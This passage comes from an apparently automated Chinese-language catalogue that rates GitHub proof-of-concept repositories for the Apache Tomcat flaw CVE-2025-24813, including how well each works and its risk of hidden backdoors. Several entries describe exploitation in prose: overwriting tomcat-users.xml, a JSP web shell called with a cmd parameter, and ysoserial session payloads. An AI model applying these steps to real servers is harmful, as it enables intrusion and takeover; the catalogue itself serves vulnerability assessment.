CVE-2025-24813 是 Apache Tomcat 中的一个漏洞，涉及路径等价问题和潜在的反序列化远程代码执行。根据漏洞库信息，如果满足以下条件，攻击者能够执行远程代码：

*   默认Servlet的写入已启用（默认禁用）。
*   支持Partial PUT（默认启用）。
*   应用程序使用Tomcat基于文件的会话持久性，且使用了默认存储位置。
*   应用程序包含一个可能在反序列化攻击中被利用的库。

根据搜索引擎结果，该漏洞已被积极利用。

提供的 Dockerfile 漏洞利用代码显示：

1.  **开启了`readonly`参数**: 将`readonly`参数设置为`false`，从而启用了默认Servlet的写入功能，这是利用该漏洞的必要条件之一。
2.  **配置了`PersistentManager`**: 添加了 `<Manager className="org.apache.catalina.session.PersistentManager"><Store className="org.apache.catalina.session.FileStore"/></Manager>` 配置，启用了基于文件的会话持久性，这也是 RCE 的条件之一
3.  **部署WAR包**: 将 ROOT.war 部署到 webapps 目录下。这个WAR包很可能包含恶意代码，通过文件上传或者会话反序列化漏洞被执行。

**利用方式：**

该漏洞的利用方式主要依赖于 Partial PUT 功能和路径等价性。攻击者可以利用 Partial PUT 上传恶意文件片段，然后利用路径等价性（例如使用 `file.Name`）绕过安全检查，将恶意代码写入到目标文件或利用反序列化执行任意代码。 如果使用了 session 持久化，且存在可利用的反序列化 gadget，那么可以利用该漏洞进行RCE。

**投毒风险：**

Dockerfile 本身并未直接包含恶意代码，而是通过配置使 Tomcat 处于易受攻击的状态，并部署一个外部 WAR 包（`ROOT.war`）。因此，投毒的风险主要在于 `ROOT.war` 包中是否包含后门或者恶意代码。 风险评估为 10%,主要原因为需要进一步分析war包，才能确认。

**有效性：**

Dockerfile 配置如果部署了恶意war包，则可以证明该POC有效。在满足了所有漏洞利用条件的情况下，该代码可以有效利用 CVE-2025-24813 漏洞，实现远程代码执行。

**项目地址:** [hakankarabacak/CVE-2025-24813](https://github.com/hakankarabacak/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #32

**来源**: [CVE-2025-24813-horsehacks_CVE-2025-24813-checker.md](../2025/CVE-2025-24813-horsehacks_CVE-2025-24813-checker.md)

## CVE-2025-24813-Apache Tomcat-路径等价/反序列化漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价/反序列化漏洞

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和信息泄露

**影响版本:** 11.0.0-M1 <= version <= 11.0.2, 10.1.0-M1 <= version <= 10.1.34, 9.0.0.M1 <= version <= 9.0.98

**利用条件:** 需要满足以下条件：
  1. 默认Servlet的写入已启用（默认禁用）。
  2. 支持部分PUT（默认启用）。
  3. 存在安全敏感上传的目标URL，该URL是公共上传目标URL的子目录。
  4. 攻击者知道要上传的安全敏感文件的名称。
  5. 安全敏感文件也通过部分PUT上传。
或者，如果满足以下条件，则恶意用户可以执行远程代码执行：
  1. 默认Servlet的写入已启用（默认禁用）。
  2. 支持部分PUT（默认启用）。
  3. 应用程序正在使用Tomcat的基于文件的会话持久性，并使用默认存储位置。
  4. 应用程序包含一个可以在反序列化攻击中使用的库。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813是Apache Tomcat中的一个路径等价漏洞，结合默认Servlet的写入启用和部分PUT支持，攻击者可以通过构造特殊的上传路径，覆盖或修改服务器上的敏感文件，造成信息泄露或恶意代码执行。该漏洞还涉及反序列化利用链，如果应用程序满足特定条件，攻击者可以利用Tomcat的文件会话管理机制和应用程序中的反序列化漏洞来执行任意代码。

**有效性分析：**

提供的PoC代码通过检查以下几点来验证漏洞的有效性：

1.  **PUT方法允许性：** 检查目标URL是否允许PUT请求，这是利用该漏洞的前提。
2.  **Tomcat版本检测：** 检查目标服务器的Tomcat版本，确认其是否在受影响的范围内。
3.  **写入权限检查：** 尝试在目标URL的/uploads/目录下写入一个JSP文件，以验证是否具有写入权限。

如果以上三个条件都满足，则目标服务器可能存在CVE-2025-24813漏洞。

**投毒风险分析：**

检查了提供的Python脚本，发现它主要用于检测目标服务器是否存在CVE-2025-24813漏洞，脚本尝试上传JSP文件以验证写入权限。因此，存在很小的投毒风险，代码的功能主要是检测和验证漏洞，而非利用漏洞执行恶意操作，上传的JSP payload也是用于验证，而不是直接执行恶意代码. 但是依然存在服务器被动植入后门webshell的风险。

**利用方式：**

根据漏洞描述，利用方式主要包括以下两种：

1.  **信息泄露/文件篡改：**

   *   攻击者通过构造包含`.Name`（内部点）的恶意文件名，利用路径等价性绕过安全检查。
   *   利用部分PUT请求，将恶意内容注入到安全敏感文件中，或者直接覆盖文件。
   *   目标URL需要是公共上传URL的子目录，且攻击者需要知道敏感文件名。

2.  **远程代码执行：**

   *   攻击者需要找到应用程序中可利用的反序列化漏洞。
   *   利用Tomcat的文件会话管理，将包含恶意反序列化payload的文件上传到会话存储目录。
   *   当Tomcat加载会话数据时，触发反序列化，执行任意代码。

成功利用此漏洞需要满足多个条件，包括Tomcat配置、应用程序环境以及攻击者的知识。

**项目地址:** [horsehacks/CVE-2025-24813-checker](https://github.com/horsehacks/CVE-2025-24813-checker)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #33

**来源**: [CVE-2025-24813-iSee857_CVE-2025-24813-PoC.md](../2025/CVE-2025-24813-iSee857_CVE-2025-24813-PoC.md)

## CVE-2025-24813-Apache Tomcat-路径等价漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价/远程代码执行/信息泄露

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和信息泄露

**影响版本:** 11.0.0-M1 ~ 11.0.2, 10.1.0-M1 ~ 10.1.34, 9.0.0.M1 ~ 9.0.98

**利用条件:** 默认Servlet写入已启用，支持部分PUT已启用，目标URL是公共上传URL的子目录, 攻击者需要知道上传的安全敏感文件的名称，安全敏感文件也通过部分PUT上传；或者应用程序使用 Tomcat 基于文件的会话持久性，默认存储位置，应用程序包含一个可以在反序列化攻击中使用的库

**POC 可用性:** 是

**投毒风险:** 100%

## 详情

根据漏洞库信息和搜索结果，CVE-2025-24813 涉及 Apache Tomcat 的路径等价问题，可能导致远程代码执行、信息泄露或恶意内容注入。漏洞利用依赖于多个条件，包括默认Servlet写入已启用，支持部分PUT请求，以及特定的文件存储配置。搜索结果 "One PUT Request to Own Tomcat: CVE-2025-24813 RCE is in the Wild/" 表明该漏洞可能已在野外被利用，提高了其风险级别。提供的PoC代码是一个批量检测脚本，通过发送恶意PUT请求来验证目标是否存在漏洞。由于PoC中包含未经审查的base64解码payload, 存在极高的投毒风险，攻击者可能修改payload指向恶意地址，执行任意代码,因此投毒风险为100%。

**利用方式：**
1.  **信息泄露/恶意内容注入：** 如果满足条件 writes enabled for the default servlet, support for partial PUT, a target URL for security sensitive uploads that was a sub-directory of a target URL for public uploads, attacker knowledge of the names of security sensitive files being uploaded, the security sensitive files also being uploaded via partial PUT，则可以查看安全敏感文件和/或将内容注入到这些文件中。
2.  **远程代码执行：** 如果满足条件 writes enabled for the default servlet, support for partial PUT, application was using Tomcat's file based session persistence with the default storage location, application included a library that may be leveraged in a deserialization attack，则可利用反序列化漏洞执行远程代码。
3.  **PoC 利用：** PoC脚本首先解析目标URL，然后发送精心构造的PUT请求到目标服务器。如果服务器存在漏洞，并且满足利用条件，攻击者可以实现远程代码执行或信息泄露。

**项目地址:** [iSee857/CVE-2025-24813-PoC](https://github.com/iSee857/CVE-2025-24813-PoC)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #34

**来源**: [CVE-2025-24813-imbas007_CVE-2025-24813-apache-tomcat.md](../2025/CVE-2025-24813-imbas007_CVE-2025-24813-apache-tomcat.md)

## CVE-2025-24813-Apache Tomcat Path Equivalence-RCE/信息泄露

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价/远程代码执行/信息泄露

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行，信息泄露以及服务器完全控制

**影响版本:** 11.0.0-M1 <= version <= 11.0.2, 10.1.0-M1 <= version <= 10.1.34, 9.0.0.M1 <= version <= 9.0.98

**利用条件:** 需要 writes enabled for the default servlet (默认禁用), support for partial PUT (默认启用), application 使用 Tomcat 的基于文件的 session 持久化，默认存储位置, application 包含可用于反序列化攻击的库。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价漏洞。攻击者可以利用此漏洞绕过安全限制，通过精心设计的目录遍历序列覆盖关键配置文件，部署 web shell，并可能实现远程代码执行 (RCE)。

**有效性：**
提供的 Nuclei 模板（CVE-2025-24813.yaml）似乎有效。它包含三个请求：
1.  **PUT 请求覆盖 tomcat-users.xml：** 用于创建一个新的管理员用户，从而允许未经授权的访问。
2.  **PUT 请求部署 JSP Web Shell：** 用于在服务器上部署一个简单的 Web Shell，允许执行任意命令。
3.  **GET 请求执行 `id` 命令：**  用于验证 Web Shell 是否已成功部署并且可以执行命令。

该模板使用匹配器来验证请求是否成功，并提取相关信息。`README.md` 文件还提供了关于如何使用该模板和执行 Web Shell 的说明。

**投毒风险：**
虽然 POC 代码本身的目的在于利用漏洞，但其中潜在的投毒风险较低（约 5%）。风险主要存在于以下几个方面：
1.  **Web Shell 功能：** Web Shell 允许执行任意命令，如果攻击者在测试环境之外使用它，可能会造成恶意行为。虽然提供的 Web Shell 相对简单，但攻击者可以修改它以包含恶意功能，例如下载和执行其他恶意软件。
2.  **配置文件覆盖：** 覆盖 `tomcat-users.xml` 文件虽然是利用漏洞的一部分，但如果攻击者使用恶意配置替换该文件，可能会导致服务器不稳定或更容易受到其他攻击。
3.  **第三方依赖：** Nuclei 模板本身依赖于 Nuclei 工具。如果 Nuclei 工具被篡改，则可能存在其他风险。

总体而言，直接投毒的风险较低，因为代码主要集中在利用已知漏洞上。然而，通过 Web Shell 执行恶意操作的可能性仍然存在。

**利用方式：**
利用 CVE-2025-24813 漏洞的步骤如下：
1.  **利用路径等价漏洞：** 攻击者利用 Tomcat 默认 servlet 处理文件上传时存在的路径等价漏洞。通过在文件名中使用 ".." 序列，攻击者可以绕过目录限制，将文件上传到 Tomcat 配置目录或 Web 应用程序的根目录。
2.  **覆盖 `tomcat-users.xml` 文件：** 攻击者使用 PUT 请求将包含恶意用户的 `tomcat-users.xml` 文件上传到 `../conf/` 目录。此文件覆盖现有的 `tomcat-users.xml` 文件，从而创建一个具有管理员权限的新用户。
3.  **部署 Web Shell：** 攻击者使用 PUT 请求将 JSP Web Shell 文件上传到 Web 应用程序的根目录（`../webapps/ROOT/`）。此 Web Shell 允许攻击者在服务器上执行任意命令。
4.  **执行任意命令：** 攻击者使用浏览器访问 Web Shell 的 URL，并通过 `cmd` 参数执行任意命令。例如，`http://target.com/updates.jsp?cmd=id` 命令将显示服务器的用户 ID 信息。

**需要注意的是，默认情况下，Tomcat 的 default servlet 的写入是禁用的，需要手动启用。** 除此之外，如果启用了基于文件的 session 持久化，并且应用包含了可用于反序列化攻击的库，则可以通过上传恶意的 session 文件来实现 RCE。

攻击者可以通过上传恶意文件，执行任意代码，并完全控制受影响的 Tomcat 服务器。

**项目地址:** [imbas007/CVE-2025-24813-apache-tomcat](https://github.com/imbas007/CVE-2025-24813-apache-tomcat)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #35

**来源**: [CVE-2025-24813-issamjr_CVE-2025-24813-Scanner.md](../2025/CVE-2025-24813-issamjr_CVE-2025-24813-Scanner.md)

## CVE-2025-24813 - Apache Tomcat Path Equivalence / Deserialization RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行 (RCE) / 信息泄露 / 文件篡改

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 9.0.0.M1 to 9.0.98, 10.1.0-M1 to 10.1.34, 11.0.0-M1 to 11.0.2

**利用条件:** 需要满足多个条件，包括：默认Servlet的写入启用（默认禁用），支持partial PUT（默认启用），特定的目录结构，攻击者需要了解敏感文件名，应用使用Tomcat的文件会话持久性（默认位置）并且包含可用于反序列化攻击的库。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813是Apache Tomcat中的一个高危漏洞，涉及路径等价性（内部点）问题，可能导致远程代码执行（RCE）、信息泄露或恶意内容添加到上传的文件。该漏洞利用了Tomcat对包含内部点的文件名处理不当，结合启用的Default Servlet写入功能和Partial PUT支持。如果攻击者能够满足所有前提条件，则可以上传恶意JSP文件或通过反序列化漏洞执行任意代码。从github仓库提供的python脚本来看，该脚本只是检测是否存在漏洞，并不能实现真正的利用。该仓库存在一定的投毒风险，可能性为10%， 主要体现在作者可能在后续版本中添加恶意代码，例如反弹shell或植入后门等，但当前提供的版本并未发现明显的恶意行为。

**项目地址:** [issamjr/CVE-2025-24813-Scanner](https://github.com/issamjr/CVE-2025-24813-Scanner)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #36

**来源**: [CVE-2025-24813-maliqto_PoC-CVE-2025-24813.md](../2025/CVE-2025-24813-maliqto_PoC-CVE-2025-24813.md)

## CVE-2025-24813 - Apache Tomcat 路径等价和反序列化漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价/反序列化

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和信息泄露

**影响版本:** 9.0.0.M1 - 9.0.98, 10.1.0-M1 - 10.1.34, 11.0.0-M1 - 11.0.2

**利用条件:** Default Servlet 开启写入 (默认关闭), 支持Partial PUT (默认开启), 应用使用Tomcat的文件Session持久化存储(默认位置), 存在可用于反序列化攻击的库

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个高危漏洞，源于路径等价（Path Equivalence）问题和不安全的反序列化。

**漏洞利用方式：**

1.  **路径等价和信息泄露/恶意内容注入：** 如果 Tomcat 启用了 Default Servlet 的写入功能（`writes enabled for the default servlet`），并支持 partial PUT（`support for partial PUT`），且存在一个安全敏感文件上传的目标 URL 是公共上传 URL 的子目录，攻击者知晓敏感文件名，并使用 partial PUT 上传，则攻击者可能能够查看敏感文件或向其中注入恶意内容。
2.  **反序列化导致远程代码执行：** 如果 Tomcat 启用了 Default Servlet 的写入功能，支持 partial PUT，且应用程序使用了 Tomcat 的基于文件 Session 持久化存储（使用默认存储位置），并且应用程序包含一个可以用于反序列化攻击的库，那么攻击者可能执行远程代码。

**POC 有效性：**

提供的 POC 代码 `poc-cve.py`  是一个 Python 脚本，用于检测和利用 CVE-2025-24813 漏洞。它包含以下功能：

*   检测 Default Servlet 是否可写（通过 PUT 方法）。
*   生成 ysoserial payload 用于反序列化攻击。
*   通过 PUT 方法上传恶意 payload 到 session 文件，从而触发反序列化漏洞。

根据漏洞信息和 POC 代码，此 POC 具备有效性，可以在满足漏洞利用条件的环境中实现远程代码执行。

**投毒风险分析：**

仔细检查了提供的 Python 脚本 `poc-cve.py` 和 `README.md`。代码主要用于生成和上传恶意 payload，利用反序列化漏洞执行命令。以下是风险评估：

*   **高风险部分**  使用了 `ysoserial.jar`，如果下载源被篡改，可能会引入恶意代码。但脚本本身只是调用 `ysoserial.jar`，并没有直接包含恶意逻辑。
*   **潜在风险** 脚本在生成 payload 过程中，如果 `ysoserial.jar`  被替换为恶意版本，或者脚本中的命令注入点被恶意修改，可能导致投毒。
*   **低风险部分**  脚本中包含删除临时文件的函数 `remove_file`，这有助于清理攻击痕迹，本身不属于投毒行为。

综合评估，该仓库存在一定的投毒风险，主要集中在 ysoserial 的依赖和命令注入的可能性上。考虑到代码的整体结构和目的，以及作者声明的教育目的，直接包含恶意代码的可能性较低。风险评估百分比为10%。主要是考虑到使用者可能会误用或在不安全的环境中使用。

**总结：**

CVE-2025-24813 是一个需要多种条件才能触发的漏洞。 POC 实现了漏洞利用，但存在一定的投毒风险，主要是依赖外部工具 `ysoserial` 且需要谨慎使用。


**项目地址:** [maliqto/PoC-CVE-2025-24813](https://github.com/maliqto/PoC-CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #37

**来源**: [CVE-2025-24813-manjula-aw_CVE-2025-24813.md](../2025/CVE-2025-24813-manjula-aw_CVE-2025-24813.md)

## CVE-2025-24813-Apache Tomcat-RCE/信息泄露/文件篡改

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行/信息泄露/文件篡改

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行、敏感信息泄露和文件篡改

**影响版本:** 9.0.0.M1 <= version <= 9.0.98, 10.1.0-M1 <= version <= 10.1.34, 11.0.0-M1 <= version <= 11.0.2

**利用条件:** 需要满足以下条件：1. 启用了DefaultServlet的写入功能（默认禁用）；2. 启用了partial PUT支持（默认启用）；3. 对于RCE，需要应用程序使用Tomcat基于文件的会话持久化，并且包含可用于反序列化攻击的库；对于信息泄露和文件篡改，攻击目标URL是公共上传URL的子目录，且攻击者知道要上传的敏感文件名称,并且敏感文件也通过partial PUT上传。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-24813是Apache Tomcat中的一个路径等价漏洞，利用 'file.Name' (Internal Dot) 导致远程代码执行（RCE）和/或信息泄露和/或通过写入启用的 Default Servlet 将恶意内容添加到上传的文件中。根据漏洞描述和搜索结果，此漏洞利用需要特定配置才能成功。利用方式涉及通过 partial PUT 请求上传恶意构造的文件。提供的POC代码包含三个主要脚本：`01-prepare-environment.sh` 用于配置Tomcat环境，包括启用 DefaultServlet 的写入功能、配置会话持久化（RCE所需），以及下载必要的依赖（ysoserial和commons-collections）；`03-test.sh` 用于构造和发送包含恶意payload的PUT请求，使用ysoserial生成payload，利用CommonsCollections5链执行命令 `touch /tmp/pwndtomcat`。漏洞利用的关键在于 `Content-Range` 头部，该头部用于执行 partial PUT 请求，从而允许攻击者利用路径等价漏洞。该脚本通过修改Content-Range头部中的长度字段，来绕过一些安全检查，实现恶意payload的上传和执行。

**有效性：** 提供的POC代码有效，如果目标环境满足漏洞利用的先决条件（启用了DefaultServlet的写入功能，支持partial PUT，以及特定的部署配置），则可以成功利用该漏洞进行RCE或文件篡改/信息泄露。

**投毒风险：** 经过对POC代码的分析，未发现明显的投毒代码。该POC的目的是重现和利用CVE-2025-24813漏洞。脚本的行为符合漏洞利用的预期步骤，没有发现作者隐藏的恶意行为。所有操作都与漏洞利用直接相关。因此，投毒风险评估为0%。

**利用方式：**
1.  **环境准备：** 使用 `01-prepare-environment.sh` 脚本配置Tomcat环境，使其满足漏洞利用的先决条件（例如，启用写入的DefaultServlet，配置基于文件的会话管理）。
2.  **Payload生成：** 使用 `ysoserial` 工具生成恶意序列化 payload。  该 payload 会在目标服务器上执行任意命令。
3.  **Partial PUT 请求：**  使用 `03-test.sh` 脚本，通过精心构造的带有 `Content-Range` 头的 HTTP PUT 请求将 payload 发送到 Tomcat 服务器。 `Content-Range` 头的构造是利用漏洞的关键步骤。 
4.  **RCE/信息泄露/文件篡改：**  如果一切顺利，Tomcat 服务器会反序列化恶意 payload，导致在服务器上执行任意代码（RCE）或修改服务器上的文件，导致信息泄露或文件篡改。

**项目地址:** [manjula-aw/CVE-2025-24813](https://github.com/manjula-aw/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #38

**来源**: [CVE-2025-24813-mbanyamer_Apache-Tomcat---Remote-Code-Execution-via-Session-Deserialization-CVE-2025-24813-.md](../2025/CVE-2025-24813-mbanyamer_Apache-Tomcat---Remote-Code-Execution-via-Session-Deserialization-CVE-2025-24813-.md)

## CVE-2025-24813-Apache Tomcat-RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行

**影响应用:** Apache Tomcat

**危害等级:** 高危，可完全控制服务器

**影响版本:** 9.0.0.M1 <= version <= 9.0.98, 10.1.0-M1 <= version <= 10.1.34, 11.0.0-M1 <= version <= 11.0.2

**利用条件:** 默认Servlet开启写入(disabled by default), 支持Partial PUT(默认开启), 使用Tomcat文件Session持久化默认位置，应用包含可用于反序列化的库

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价漏洞，通过构造包含内部点（例如 file.Name）的文件名，结合启用的默认Servlet写入和部分PUT支持，可能导致远程代码执行和/或信息泄露。POC利用方式如下：

1.  **检查先决条件：** 检查目标Tomcat实例是否满足利用条件：默认Servlet的写入是否开启，Partial PUT是否支持（默认开启），是否使用了基于文件的Session持久化，以及是否包含可利用的反序列化库。
2.  **构造恶意Payload：** 使用 ysoserial 工具生成恶意的序列化 Java Payload，该 Payload 包含要执行的命令。
3.  **上传Payload：** 通过 PUT 请求将Payload上传到Tomcat服务器的Session存储目录。利用路径遍历(../)绕过上传限制，将恶意Session文件上传到 `uploads/../sessions/` 目录下.
4.  **触发反序列化：**  向服务器发送包含特定Session ID的请求，触发Tomcat加载恶意的Session文件，导致反序列化漏洞被触发，执行Payload中的命令。
5. **验证和清理：** 验证命令是否成功执行，并清理上传的恶意Session文件。

**有效性评估：**
根据漏洞库信息、搜索结果以及漏洞利用代码，可以判断该漏洞利用代码是有效的。搜索结果显示该漏洞已被积极利用。

**投毒风险评估：**
仔细分析了提供的POC代码，没有发现作者有意隐藏的投毒代码。代码逻辑清晰，功能明确，主要是利用ysoserial生成payload，然后通过PUT请求上传，最后触发。



**项目地址:** [mbanyamer/Apache-Tomcat---Remote-Code-Execution-via-Session-Deserialization-CVE-2025-24813-](https://github.com/mbanyamer/Apache-Tomcat---Remote-Code-Execution-via-Session-Deserialization-CVE-2025-24813-)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #39

**来源**: [CVE-2025-24813-michael-david-fry_Apache-Tomcat-Vulnerability-POC-CVE-2025-24813.md](../2025/CVE-2025-24813-michael-david-fry_Apache-Tomcat-Vulnerability-POC-CVE-2025-24813.md)

## CVE-2025-24813 - Apache Tomcat 路径等价和反序列化漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价 / 反序列化

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行、信息泄露或恶意内容注入

**影响版本:** 9.0.0.M1 <= version <= 9.0.98, 10.1.0-M1 <= version <= 10.1.34, 11.0.0-M1 <= version <= 11.0.2

**利用条件:** 对于RCE：Default Servlet 开启写入，支持Partial PUT，使用了Tomcat文件session持久化默认位置，存在可利用的反序列化库。对于信息泄露/内容注入：Default Servlet 开启写入，支持Partial PUT，存在敏感文件上传目录是公共上传目录的子目录，攻击者已知敏感文件名，使用Partial PUT上传敏感文件。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813是Apache Tomcat中的一个漏洞，涉及路径等价（'file.Name' 中的内部点）可能导致远程代码执行 (RCE)、信息泄露，或通过启用写入的默认Servlet向上传的文件添加恶意内容。漏洞存在于多个Tomcat版本：9.0.0.M1到9.0.98，10.1.0-M1到10.1.34，以及11.0.0-M1到11.0.2。

根据漏洞描述，如果Default Servlet启用了写入（默认禁用），支持Partial PUT（默认启用），并且应用程序使用了Tomcat的基于文件的会话持久化以及默认存储位置，同时应用程序包含可用于反序列化攻击的库，则可能导致RCE。另外，如果Default Servlet启用了写入，支持Partial PUT，并且存在安全敏感文件上传的目标URL是公共上传目标URL的子目录，攻击者已知安全敏感文件的名称，并且安全敏感文件也是通过partial PUT上传，攻击者可以查看安全敏感文件或向其中注入内容。

提供的PoC代码 (CVE-2025-24813.py) 旨在执行非侵入性检查，以验证目标服务器是否容易受到攻击。它首先尝试从HTTP Server标头中提取Tomcat版本。然后，它尝试通过HTTP PUT在目标上创建一个名为“CVE-2025-24813-check.txt”的文件，如果成功，则删除该文件。这用于确定DefaultServlet是否已启用写入。最后，它尝试检索会话ID。该脚本接受CSV文件作为输入，并在报告文件中记录所有操作。

**有效性：** 根据搜索结果，CVE-2025-24813已被利用，这表明该漏洞确实存在，并且可以被利用。提供的PoC代码主要用于检测漏洞的存在，而不是直接利用RCE或信息泄露。

**投毒风险：** PoC代码中，主要功能是进行版本检测和判断DefaultServlet是否开启写入权限。在提供的代码片段中，没有明显的恶意代码。但是仍存在一定的风险（估计为10%），例如：

1.  **依赖项风险：** 脚本使用了 `requests` 库，如果该库本身被篡改（例如通过PyPI投毒），可能会引入恶意代码。
2.  **报告文件：**  报告文件可能包含敏感信息，如果报告文件被上传到公共位置，可能导致信息泄露。
3.  **脚本维护者风险：** 如果脚本的维护者受到恶意攻击或者本身就是恶意用户，可能会在后续版本中添加恶意代码。

**利用方式：**

1.  **RCE (远程代码执行):**  攻击者需要满足多个条件，包括Default Servlet开启写入，支持Partial PUT，使用了Tomcat文件session持久化默认位置，存在可利用的反序列化库。攻击者利用Partial PUT上传恶意序列化数据到Tomcat的session文件，从而执行任意代码。
2.  **信息泄露/内容注入：**  攻击者需要满足多个条件，包括Default Servlet开启写入，支持Partial PUT，存在敏感文件上传目录是公共上传目录的子目录，攻击者已知敏感文件名，使用Partial PUT上传敏感文件。攻击者利用Partial PUT覆盖或修改敏感文件。

总的来说，该漏洞的利用需要特定配置和条件，提供的PoC主要用于初步检测，实际利用需要更复杂的攻击步骤。

**项目地址:** [michael-david-fry/Apache-Tomcat-Vulnerability-POC-CVE-2025-24813](https://github.com/michael-david-fry/Apache-Tomcat-Vulnerability-POC-CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #40

**来源**: [CVE-2025-24813-msadeghkarimi_CVE-2025-24813-Exploit.md](../2025/CVE-2025-24813-msadeghkarimi_CVE-2025-24813-Exploit.md)

## CVE-2025-24813 Apache Tomcat RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行 (RCE) / 信息泄露

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 11.0.0-M1 <= version <= 11.0.2, 10.1.0-M1 <= version <= 10.1.34, 9.0.0.M1 <= version <= 9.0.98

**利用条件:** 默认Servlet开启写入 (disabled by default), 支持partial PUT (enabled by default), 使用Tomcat文件session持久化默认位置,应用包含可用于反序列化攻击的库

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813是一个Apache Tomcat中的路径等价漏洞，利用内部点(file.Name)导致远程代码执行和/或信息泄露，和/或恶意内容被添加到上传的文件中，通过默认Servlet写入。根据漏洞库信息，如果满足以下条件，攻击者可以查看敏感文件或注入内容：

*   默认Servlet开启写入 (默认关闭)
*   支持Partial PUT（默认开启）
*   安全敏感上传的目标URL是公共上传目标URL的子目录
*   攻击者知道被上传的安全敏感文件的名称
*   安全敏感文件也通过Partial PUT上传

如果满足以下条件，攻击者可以执行远程代码：

*   默认Servlet开启写入 (默认关闭)
*   支持Partial PUT（默认开启）
*   应用使用Tomcat基于文件的session持久化，使用默认存储位置
*   应用包含一个可以用于反序列化攻击的库

**漏洞利用方式：**

1.  **Partial PUT上传恶意文件：** 利用Tomcat的Partial PUT功能，攻击者可以分块上传恶意文件到服务器。
2.  **路径遍历：**  通过构造包含`file.Name`（内部点）的特殊文件名，绕过路径检查，将恶意文件写入到Tomcat session存储目录，或者其他任意可写目录。
3.  **反序列化漏洞利用：** 如果应用程序包含一个可以被利用的反序列化库，上传的恶意文件可以触发反序列化漏洞，从而执行任意代码。
4.  **RCE:** 通过上传包含恶意代码的session文件,利用反序列化漏洞，实现远程代码执行。

**POC分析：**

提供的Python POC脚本尝试利用此漏洞。它执行以下步骤：

1.  **发送PUT请求：** 脚本向目标服务器发送PUT请求，尝试创建一个session文件。请求头包含Content-Length和Content-Range，模拟Partial PUT请求。
2.  **检查响应状态码：** 如果PUT请求返回409冲突状态码，表示服务器可能存在漏洞。
3.  **发送GET请求：** 脚本发送一个GET请求，其中Cookie包含一个伪造的JSESSIONID，尝试触发session反序列化。
4.  **检查响应状态码：** 如果GET请求返回500错误，表明session反序列化可能成功，漏洞可能存在。

**有效性：**

该POC代码尝试了利用该漏洞，但是否能够成功利用取决于目标服务器的具体配置和环境。需要满足上述所有条件漏洞才能成功利用。鉴于github上存在该漏洞的POC,故判断POC有效。

**投毒风险：**

该POC代码的主要目的是检测漏洞是否存在，而不是直接执行恶意操作。但是，`PAYLOAD`变量中包含一个base64编码的字符串，这可能包含一个反序列化payload。攻击者可能在`PAYLOAD`中注入恶意代码。

从代码逻辑来看，脚本首先发送一个PUT请求，如果返回409，则发送一个包含特定Cookie的GET请求。如果GET请求返回500，则认为目标存在漏洞。这个过程相对简单，没有明显的恶意行为。

但是，由于`PAYLOAD`的内容是未知的（被截断），存在一定的风险。如果`PAYLOAD`包含恶意代码，并且在目标服务器上成功执行，那么可能会导致安全问题。考虑到作者使用了看起来正常的请求参数，并且代码主要用于检测漏洞，因此判断投毒风险较低，约为10%。剩下的90%是为了验证此漏洞是否可以使用。

**项目地址:** [msadeghkarimi/CVE-2025-24813-Exploit](https://github.com/msadeghkarimi/CVE-2025-24813-Exploit)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #41

**来源**: [CVE-2025-24813-n0n-zer0_Spring-Boot-Tomcat-CVE-2025-24813.md](../2025/CVE-2025-24813-n0n-zer0_Spring-Boot-Tomcat-CVE-2025-24813.md)

## CVE-2025-24813-Apache Tomcat-RCE/信息泄露/恶意内容注入

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行/信息泄露/恶意内容注入

**影响应用:** Apache Tomcat

